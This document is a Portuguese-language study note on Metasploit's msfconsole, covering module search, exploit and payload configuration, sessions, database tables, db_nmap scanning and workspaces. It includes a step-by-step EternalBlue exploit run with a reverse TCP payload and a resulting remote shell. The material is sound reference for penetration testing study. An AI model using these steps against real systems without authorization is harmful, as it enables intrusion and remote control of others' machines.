Principal interface para interagir com o [[1. Metasploit Framework]]. Através dessa ferramenta é possível fazer, num mesmo lugar: scanning de hosts e portas, reconhecimento de serviços, detecção e exploração de vulnerabilidades, pós-exploração, ataques [[7. Denial of Service|DoS]] e muito mais.

Esta ferramenta faz parte de um pacote de ferramentas do Metasploit Framework, para mais detalhes, ver a [[1. Metasploit Framework|nota agregada]].

Para acessar a ferramenta, basta utilizar o comando `msfconsole`:

```shell
$ msfconsole
```

# Módulos

O Metasploit Framework gira em torno de módulos, portanto, é importante a leitura da seção [[1. Metasploit Framework#Módulos|Metasploit Framework - Módulos]]. O `msfconfole` consegue interagir com esses módulos para scanning, geração de payloads, execução de exploits etc.

## Busca por módulos

Dentro do `msfconsole` é possível listar todos os módulos com o seguinte comando:

```shell
msf> search
```

É também possível filtrar e ordenar os módulos com base numa série de parâmetros que podem ser combinados. Exemplo:

```shell
msf> search type:exploit platform:windows "buffer overflow"
```

- `type:<module>`: filtra pelos módulos de tipo `<module>`; ex.: `type:exploit`
- `platform:<platform>`: filtra pelos módulos que afetam determinado SO `<platform>`; ex.: `platform:windows`.
- `cve:<cve-id>`: filtra pelos módulos respectivos a um [[7. CVE]].
- `att&ck:<att&ck-d>`: filtra pelos módulos respectivos a um **MITRE ATT&CK ID**.
- `edb:<edb-id>`: filtra pelos módulos respectivos a um [[4. Base de dados de vulnerabilidades e exploits#[Exploit-DB](https //www.exploit-db.com/)|Exploit-DB]] ID.
- `date:<date>`: filtra pelos módulos descobertos numa data `<date>`; ex.: `date:2008`, `date:2025-08`, `date:2015-04-08`.
- `path:<path>`: filtra pelos módulos que possuem determinado path `<path>`; ex.: `path:windows/smb`.
- `rank:<rank>`: filtra pelos `exploits` de um determinado rank `<rank>`, que determina o potencial de impacto nos sistemas alvos. Indo do menor ao maior impacto, podem ser: `excellent`, `great`, `good`, `normal`, `average`, `low`, `manual`.
- `"<value>"`: filtra pelos módulos que contenham o texto `<value>` em qualquer parte de seu nome, descrição etc.
- `-R <expression>`: filtram pelos módulos que correspondam a uma determinada expressão regular `<expression>`. 
- Para mais detalhes de parâmetros de filtro, digite `search --help` e veja a seção **Keywords**.

É também possível ordenar o resultado da busca com as seguintes opções:

- `-s <column>`: ordena de forma ascendente pela coluna `<column>`.
- `-r <column>`: ordena de forma decrescente pela coluna `<column>`.

Os valores possíveis de `<column>` são: `rank`, `date` ou `disclosure_date`, `name`, `type`, `check` e `action`. Para mais detalhes, ver a seção **Supported search columns** de `search --help`.

Ao filtrar módulos com o `search`, o resultado é colocado num cache em que os módulos podem ser indexados pelos seus ids, para facilitar a referenciação.

## Informações de um módulo

É possível buscar as informações de um módulo para entender sua funcionalidade, condições em que pode ser utilizado, variáveis para execução etc. É possível fazer essa busca com o comando `info <module>`, em que `<module>` pode ser tanto o caminho completo do módulo quanto seu índice.

```shell
msf> info auxiliary/scanner/smb/smb_version
# ou
msf> search path:auxiliary/scanner/smb
msf> info 16
```

## Selecionar um módulo

Para usar um módulo, basta utilizar o comando `use <module>`, em que `<module>` pode ser tanto o caminho completo do módulo quanto seu índice.

```shell
msf> use auxiliary/scanner/smb/smb_version
# ou
msf> search path:auxiliary/scanner/smb
msf> info 16
```

## Parâmetros de um módulo

Para verificar os parâmetros que um módulo aceita, utilize a opção `show options`:

```shell
msf auxiliary(scanner/smb/smb_version)> show options
# Module options (auxiliary/scanner/smb/smb_version):
#
#   Name     Current Setting  Required  Description
#   ----     ---------------  --------  -----------
#   RHOSTS                    yes       The target host(s), see ...
#   RPORT                     no        The target port (TCP)
#   THREADS  1                yes       The number of concurrent thr...
```

> [!tip] `show advanced`
> Uma alternativa mais completa ao `show options` é o `show advanced`, que exibirá mais parâmetros configuráveis.

Geralmente módulos que se conectam com hosts alvo possibilitam informar os parâmetros `rhosts`(remote hosts) e `rport`(remote port).

Para configurar o valor de um parâmetro, basta usar o comando `set <parameter> <value>`:

```shell
msf auxiliary(scanner/smb/smb_version)> set rhosts 192.168.0.50,192.168.0.51
# ou
msf auxiliary(scanner/smb/smb_version)> set rhosts 192.168.0.50-51
```

Conforme os scripts forem sendo executados, informações sobre os recursos identificados são salvas num banco de dados como explicado na seção [[#MSF Database]]. Com isso, é possível consultar e filtrar os hosts desses recursos e exportá-los automaticamente para o parâmetro `rhosts` com a opção `--rhosts`. Para mais detalhes, veja cada sub seção de [[#MSF Database#Recursos salvos| MSF Database - Recursos]].

> [!info] Parâmetros de payloads
> Os módulos do tipo `payload` que fazem algum tipo de conexão reversa geralmente possuem os parâmetros `LPORT` e `LHOST`. Cada um deles se referem, respectivamente, a porta e o endereço IP **local**, portanto, da sua máquina ou qualquer outra máquina em que o host destino deve iniciar interação.

## Executar módulo

Com um módulo selecionado e configurado, é possível executá-lo com o comando `run`:

```shell
msf auxiliary(scanner/smb/smb_version)> run
```

## Módulos do tipo `exploit`

Um módulo do tipo `exploit` é aquele que é usado para explorar uma vulnerabilidade identificada num host alvo. Os exploits trabalham em conjunto com os payloads, que é o código executado assim que uma vulnerabilidade é explorada.

Os exploits, se executados com sucesso, abrem uma [[#Seções|seção]] dentro do ambiente do framework. Com a seção aberta é possível interagir com o host alvo.

Um módulo exploit pode ser selecionado como qualquer outro módulo:

```shell
msf> use exploit/windows/smb/ms17_010_eternalblue
```

### Configurar `payload`

Um exploit pode ser utilizado com uma variedade de payloads diferentes. Essa modularidade permite que o payload ideal seja escolhido conforme o host que se deseja atacar e vai depender do sistema operacional, arquitetura de CPU, ferramentas disponíveis no alvo etc. 

Alguns exploits já possuem um payload padrão selecionado, que pode ser visualizado com o comando `get payload`,

```shell
msf exploit(windows/smb/ms17_010_eternalblue)> get payload
# payload => windows/x64/meterpreter/reverse_tcp
```

Caso queira listar todos os payloads compatíveis com o exploit, basta executar `show payloads`:

```shell
msf exploit(windows/smb/ms17_010_eternalblue)> show paylods
# Compatible Payloads
# ===================
# 
#    #   Name                                Rank    Check  Description
#    -   ----                                ----    -----  -----------
#    0   payload/generic/custom              normal  No     Custom Payload
#    1   payload/generic/shell_bind_aws_ssm  normal  No     Command Shell...
#    2   payload/generic/shell_bind_tcp      normal  No     Generic Command...
#    3   payload/generic/shell_reverse_tcp   normal  No     Generic Command...
```

Para selecionar um outro payload, é possível usar o comando `set payload <name|index>`

```shell
msf exploit(windows/smb/ms17_010_eternalblue)> set paylod payload/generic/shell_reverse_tcp
# ou
msf exploit(windows/smb/ms17_010_eternalblue)> set paylod 3
```

Os parâmetros de payload também pode ser visualizados com a opção `show options` ou `show advanced`.

### Executar exploit

Exploits podem ser executados através de dois comandos: `run` ou`exploit`:

```shell
msf exploit(windows/smb/ms17_010_eternalblue)> run
# [*] Started reverse TCP handler on <LHOST>:<LPORT> 
# [*] <RHOST>:<RPORT> - Using auxiliary/scanner/smb/smb_ms17_010 as check
# [+] <RHOST>:<RPORT>       - Host is likely VULNERABLE to MS17-010! - ...
# [*] <RHOST>:<RPORT>       - Scanned 1 of 1 hosts (100% complete)
# [+] <RHOST>:<RPORT> - The target is vulnerable.
# [*] <RHOST>:<RPORT> - Connecting to target for exploitation.
# [+] <RHOST>:<RPORT> - Connection established for exploitation.
# ...
# [*] Command shell session 1 opened at ...

```

A maioria das vulnerabilidades, quando exploradas com sucesso, executam payloads que abrem algum tipo de conexão interativa entre o atacante e o alvo, permitindo que o atacando envie comandos e receba respostas.

Esse canal interativo é chamado de [[#Sessões|sessão]]

> [!tip] Executar exploit em background
> Com a opção `run -j` um job em segundo plano é inicializado, permitindo o uso normal do `msfconsole` enquanto o exploit é executado. Logs serão exibidos no console enquanto a job é executada em background. É possível listar as jobs em execução com o comando `jobs`.

### Sessões

Uma sessão é uma conexão estabelecida com sucesso entre atacante e alvo. Através dessa conexão, um atacante possui acesso ao sistema remoto, podendo executar uma variedade comandos. 

A complexidade dos comandos disponíveis vai depender do tipo de payload executado; payloads podem abrir desde um terminal simples (cmd, bash etc) até um [[1. meterpreter]], que é um tipo de sessão, específica do Metasploit Framework, que possui uma variedade de comandos úteis para pós-exploração.

É possível ter múltiplas sessões abertas simultaneamente, que podem ser listadas com o comando `sessions`:

```shell
msf> sessions
# Active sessions
# ===============
#   Id  Name  Type           Information   Connection
#   --  ----  ----           -----------   ----------
#   1         shell x64/win  Microsoft...  <LHOST>:<LPORT> -> <RHOST>:<RANDOM>
#   2         ...            Debian...     <X>:<Y> -> <Z>:<RANDOM>
```

É possível trocar de sessões com `sessions -i <index>`:

```shell
msf> sessions -i 1
# [*] Starting interaction with 1...
# Shell Banner:
# Microsoft Windows [Version 6.1.7600]
# Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\windows\system32>
```

Para sair de uma sessão, geralmente basta dar um `CTRL + C`.

```shell
C:\windows\system32>

^C
Abort sessions 1? [y/N]:
```

> [!warning] Abortar sessão
> Ao abortar uma sessão, ela será encerrada e a conexão com o host alvo será perdida. Para voltar a interagir com o alvo, será necessário executar o exploit novamente.

Há mais opções de controle de sessões, como: matar uma sessão, filtrar por sessões, fazer upgrade de uma sessão para uma do tipo `meterpreter` etc. Essas opções que podem ser vistos em mais detalhes em `sessions -h`.

# MSF Database

O **Metasploit Framework Database** é um banco de dados que contém todas as informações coletadas sobre hosts alvos, serviços e vulnerabilidades detectadas. Por padrão, o `msfconsole`, ao ser inicializado, tenta se conecta ao banco de dados conforme o arquivo de configuração `~/.msf4/config`, se o arquivo não existir ou o banco estiver fora do ar, o console entra em modo "stateless", em que nenhuma informação será salva e uma série de ferramentas internas são desabilitadas.

## Criar banco

Para criar um banco de dados, é utilizado o utilitário [[1. msfdb]] fora do ambiente do `msfconsole`, portanto é recomendável ler a nota referenciada antes de continuar.

## Conectar ao banco

Como dito anteriormente, o `msfconsole` tenta se conectar ao banco logo ao ser inicializado. Contudo, caso seja necessário trocar o servidor de banco de dados ou schema, é possível fazer com o comando `db_connect`:

```msf
msf> db_connect <user>:<password>@<host>/<database>
```

Após estar conectado a um banco de dados, todos as operações que geram informações sobre os hosts, serviços e vulnerabilidades identificadas serão salvos e persistidos.

## Recursos salvos

Ao realizar as etapas de um ataque dentro do ambiente do `msfconsole`, algumas da informações são salvas e persistidas no banco de dados. Dentro as informações salvas estão:
 
### `hosts`

Acessado pelo comando `hosts`, exibe uma tabela contendo o IP de todos os hosts identificados e informações adicionais como Sistema Operacional, [[5. MAC Address]], versão, propósito da máquina etc.

```shell
msf> hosts
# address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
# -------       ---  ----  -------  ---------  -----  -------  ----  --------
# 172.16.1.2               X        ABC        XYZ     device
# 172.16.1.3         Foo   Y                           server

```

Note que nem sempre é possível adquirir todas as informações sobre um hosts específico. Caso você identifique algo que não foi salvo, é possível editar alguma das informações dessa tabela:

- `-i, --info <info> <hosts>`: edita o conteúdo da coluna `info`. É possível especificar um host ou vários separados por vírgula; também é possível especificar um range de IP no formato `192.16.1.10-50` ou uma máscara de rede `192.16.1.0/24`.
- `-m, --comment <comment> <hosts>`: edita o conteúdo da coluna `comment`.
- `-n, --name <name> <hosts>`: edita o conteúdo da coluna `name`.

É também possível deletar hosts com a opção `-d, --delete <hosts>` ou manualmente adicionar um host com `a, --add <host>`.

```shell
msf> hosts --delete 172.16.1.2
msf> hosts --add 172.16.1.2
msf> hosts --info "New Info" 172.16.1.2
msf> hosts --comment "New Comment" 172.16.1.2
```

> [!warning] Cuidado com `-d, --delete` sem parâmetro
> Informar `-d` ou `--delete` sem nenhum host, fará com que todos os hosts salvos sejam deletados.

Para filtrar hosts, basta usar a opção `-S, --search <text>` que qualquer host que possuir uma coluna que corresponda a `<text>` será retornado. Não é possível filtrar por coluna específicas.

> [!tip] Exportação e `RHOSTS`
> A tabela de hosts pode ser exportada em `csv` com a opções `-o, --output <filename>`. É possível, também, exportar os hosts para a variável `rhosts` com o comando `-R, --rhosts`.

### `services`

Junto com os hosts identificados, é também possível salvar os serviços que estão rodando em cada um dos hosts. Para visualizar, basta usar o comando `services`:

```shell
msf> services
# ost           port  proto  name         state  info
# ----          ----  -----  ----         -----  ----
# 172.16.1.2    139   tcp    netbios-ssn  open   Microsoft Windows netbios-ssn
# 172.16.1.3    445   tcp    smb          open   SMB Detected (versions:1)
```

Assim como no caso do `hosts`, o comando `services` também é capaz de filtrar com `-S, --search <text>`. Além disso, também é possível filtrar por portas (`-p, --port <ports>`) e/ou protocolo (`-r, --protocol <protocol>`).

```shell
msf> services --delete 172.16.1.2 -p 139 -r tcp
msf> services --add 172.16.1.2 -p 138 -r tcp
```

> [!NOTE] Host necessita existir
> Note que para adicionar um serviço, é necessário que o host exista em `hosts`.

Infelizmente não há forma de editar a coluna `info` pelo `msfconsole`.

> [!tip] Editar pelo banco de dados
> Por mais que não seja possível editar algumas informações do serviço diretamente pelo comando `services` dentro do `msfconsole`, é possível acessar o banco de dados em que as informações são salvas. Para isso, basta conectar com a connection string contida em `~/.msf4/config`, ir na tabela `services` e procurar pelo serviço correto.

Também é possível deletar serviços com `-d, --delete <hosts>` e adicionar com `-a, --add <host>`. Note que as opções de porta (`-p`) e protocolo (`-r`) podem ser utilizadas nas operações de deleção e adição: no primeiro caso, as opções são usadas para filtrar quais serviços serão deletados, enquanto no segundo serão usados para preencher as informações do serviço.

> [!warning] Cuidado com `-d, --delete` sem parâmetro
> Informar `-d` ou `--delete` sem nenhum host ou filtro de porta/protocolo, fará com que todos os serviços salvos sejam deletados.

> [!tip] Exportação e `RHOSTS`
> A tabela de serviços pode ser exportada em `csv` com a opções `-o, --output <filename>`. É possível, também, exportar os hosts para a variável `rhosts` com o comando `-R, --rhosts`.

### `vulns`

Tabela que contém todas as vulnerabilidades identificadas em um `host`. Geralmente preenchida ao rodar módulos de scanning para detectar vulnerabilidades. Pode ser acessada pelo comando `vulns`:

```shell
msf> vulns
# Timestamp   Host          Name          References
# ---------   ----          ----          ----------
# 2025-11-30  172.16.1.60   MS17-010 SMB  CVE-2017-0143,CVE-2017-0144 ...
```

É possível filtrar vulnerabilidades das seguintes maneiras:

- `vulns <hosts>`: exibe as vulnerabilidades de host(s) específico(s).
- `vulns -p <ports>`: exibe as vulnerabilidades identificadas sem serviços de `<ports>`.
- `vulns -s <service>`: exibe as vulnerabilidades de um determinado serviço, exemplo `http`, `ftp`, `ssh`, `smb` etc.

> [!tip] Exportação e `RHOSTS`
> A tabela pode ser exportada em `csv` com a opção `-o, -output <filename>`. É possível, também, exportar os hosts para a variável `rhosts` com o comando `-R, --rhosts`.

## db_nmap

Ferramenta wrapper do [[1. nmap]] em que os resultados de hosts, serviços e vulnerabilidades identificadas são salvas no [[#MSF Database]]. 

```shell
msf> db_nmap -n -sS -p21,22,445,139 --open 172.16.1.0/24
```

No exemplo acima, ao final do comando, todas as informações adquiridas dos hosts disponíveis que comportem a máscara `172.16.1.0/24` e que tenham as portas TCP `21,22,44,139` abertas serão salvas nas tabelas `services` e `hosts`.

Scripts NSE podem ser usados para refinar ainda mais as informações salvas. Para mais detalhes sobre scripts, ver [[1. nmap#NSE (Nmap Script Engine)|Nmap Script Engine]].

> [!tip] Scripts de vulnerabilidade
> Vulnerabilidades identificadas por scripts NSE de categoria `vuln` também serão salvas na tabela `vulns`.

### Importar resultado do nmap com db_import

Por mais que o `db_nmap` seja um conveniente dentro do `msfconsole` seu uso não é obrigatório. É perfeitamente possível utilizar diretamente o `nmap` e importar seus resultados para o [[#MSF Database]].

Para isso, basta executar a ferramenta com a opção de output `-o`, que exporta o resultado em XML:

```shell
$ nmap -n -sS -p21,22,445,139 --open 172.16.1.0/24 -o /tmp/scanning.xml
```

O resultado pode ser importado com o comando `db_import` dentro do `msfconsole`:

```shell
msf> db_import /tmp/scanning.xml
```

# Workspaces

Um workspace do `msfconsole` serve para separar o contexto das informações adquiridas e salvas no [[#MSF Database]]. Pode ser útil, por exemplo, quando se quer fazer uma separação por rede, cliente contratado ou até mesmo criar espaços para testes.

Cada workspace terá suas próprias informações de `hosts`, `services` e `vulns` e um workspace não interferirá nas informações dos outros.

Todo `msfconsole` tem, por padrão, o workspace `default`.

## Criar workspace

É possível criar novos workspaces com o subcomando `workspace`:

```shell
msf> workspace --add 'test'
```

O contexto será automaticamente trocado para o do workspace criado.

## Listar e trocar de workspace

Também é possível listar os workspaces disponíveis e exibir qual o que está selecionado no momento:

```shell
msf> workspace
#   default
# * test
```

Para trocar o workspace, basta informar seu nome:

```shell
msf> workspace <name>
```

## Deletar workspace

Um workspace pode ser deletado com `workspace --delete <name>`:

```shell
msf> workspace --delete <name>
```

> [!warning] Deletar um workspace deletará todas as informações salvas
> Cuidado que, ao deletar um workspace, todos as informações relacionados à este workspace serão deletadas do MSF Database (hosts, services, vulns etc). Por se tratar de um hard delete, essa ação não pode ser revertida.
